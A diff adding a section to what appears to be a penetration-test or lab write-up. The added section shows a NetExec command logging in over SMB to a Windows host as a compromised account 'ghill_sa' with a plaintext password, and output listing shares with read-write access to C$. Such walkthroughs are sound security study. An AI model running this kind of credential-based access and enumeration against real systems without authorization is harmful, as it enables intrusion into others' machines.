@@ -325,3 +325,18 @@ SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa
 ```
 This user has now been compromised, now i can start some more enumeration
 
+## Access on SMB as `ghill_sa` on the windows workstation
+```python
+nxc smb EC2AMAZ-NS87CNK.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth --shares
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:None)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! 
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [*] Enumerated shares
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  Share           Permissions     Remark
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  -----           -----------     ------
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  ADMIN$          READ            Remote Admin
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  C$              READ,WRITE      Default share
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  IPC$            READ            Remote IPC
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  Share           READ,WRITE
+```
+This user has a lot of access on SMB here
+
